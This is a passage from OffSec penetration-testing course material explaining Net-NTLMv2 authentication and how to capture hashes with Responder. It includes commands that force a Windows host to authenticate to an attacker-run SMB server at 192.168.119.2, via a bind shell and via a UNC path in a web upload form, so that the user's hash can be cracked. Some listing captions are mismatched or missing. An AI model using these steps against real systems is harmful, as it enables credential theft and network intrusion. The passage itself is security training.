
# OffSec

Penetration Testing with Kali Linux

We use "Net-NTLMv2" to refer to the formally correct NTLMV2. Since "Net-NTLMv2" is more commonly used in our industry, we use it in this course to avoid confusion.

Let's walk through an example to get familiar with the basics of the authentication process. Our goal is to access an SMB server on a Windows 2022 server from a Windows 11 client via Net-NTLMv2.

At a high level, we will send the server request, outlining the connection details to the SMB share. The server will send us a challenge in which we encrypt data for our response with our NTLM hash to prove our identity. The server will then check our challenge response and grant or deny access, accordingly.

However, our goal is to use Net-NTLMv2 for this exercise because it is less secure than the more modern Kerberos protocol. This is common in the real-world where the majority of Windows environments still rely on the older protocol, especially as a way to support older devices that may not support Kerberos.

Since we find Net-NTLMv2 in nearly all Windows networks and environments, it is vital to understand how we can abuse its techniques. To do this, we need our target to start an authentication process using Net-NTLMv2 against a system we control. We need to prepare our system that handles the authentication process and use the Net-NTLMv2 hash the target user to authenticate.

The Responder is excellent for this. It includes a built-in SMB server that handles the authentication for us and captures Net-NTLMv2 hashes. While it also includes other protocols (including HTTP and FTP) as well Link-Local Name Resolution (LLMNR), NetBIOS Name Resolution (NBT-NS) and Multicast DNS (MDNS) poisoning capabilities, we'll be on capturing Net-NTLMv2 hashes with the SMB server in this section.

If we've obtained code execution on a system, we can easily force it to authenticate by commanding it to connect to our prepared SMB server. For example, we can simply run \\192.168.119.2 in PowerShell (assuming our Responder is listening on it). If we don't have code execution, we can use other vectors to force an authentication. For example, when we discover a file upload form in a web application on a Windows server, we can try to upload a non-existing file with a UNC path \\192.168.119.2\nonexistent.txt. If the web application supports SMB, our Responder server will authenticate to our SMB server.

Listing 300 - Connect to the bind shell on port 4444**

The output shows the shell runs as the user paul, which is not a local administrator on the FILES01 system. Intriguingly, paul is a member of the Remote Desktop Users, which allows us to connect to the system with SDP.

For the sake of this demonstration, let's assume the user gunther (which we used in the previous section) does not exist or we don't have access to the account. In this case, we only have access to paul on this system.

Since we don't have privileges to run Mimikatz, we cannot extract passwords from the system. But we can set up an SMB server with Responder on our Kali machine, connect to it with the user paul and crack the Net-NTLMv2 hash used in the authentication process. Let's do this now. First, we'll run ip addr to retrieve a list of all interfaces. Then we'll run responder (which is already installed on Kali) noting that your interface may differ from what is shown here.

```
kali@kali:-$ ip addr

Listing 301 - Starting Responder on interface tap0

The output shows that Responder is listening for events and the SMB server is active. Our next step is to access a non-existent SMB share on our Responder using paul's bind shell. We will do this with a simple dir listing \\192.168.119.2\test, which "test" is an arbitrary name. We are only interested in the authentication process, not a share listing. Let's switch back to the terminal connecting Netcat bind process and enter the command.

```
C:\Windows\system32>dir \\192.168.119.2\test
